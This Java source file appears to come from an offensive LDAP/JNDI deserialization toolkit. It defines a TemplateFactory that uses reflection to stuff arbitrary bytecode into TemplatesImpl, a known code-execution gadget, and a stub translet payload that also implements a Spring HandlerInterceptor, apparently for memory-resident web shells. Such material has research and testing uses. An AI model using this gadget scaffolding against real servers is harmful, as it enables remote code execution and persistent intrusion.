package com.idiot9.ldap.templates;

import com.idiot9.ldap.gadgets.utils.ClassFiles;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.CannotCompileException;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.xml.transform.Templates;
import java.io.Serializable;

public interface TemplateFactory {
    public void createTemplatesImpl() throws CannotCompileException, Exception;
    public String getClassName();
    public Templates getTemplates();
    void cache() throws Exception;
    public byte[] getBytes();

    final Class tplClass = TemplatesImpl.class;
    final Class abstTranslet = AbstractTranslet.class;
    final Class transFactory = TransformerFactoryImpl.class;

    public static Templates loadBytes(byte[] bytes, Templates templates) throws Exception {
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
        Reflections.setFieldValue(templates, "_name", "1diot9");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }



    public static class StubTransletPayload extends AbstractTranslet implements Serializable, HandlerInterceptor {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }
}
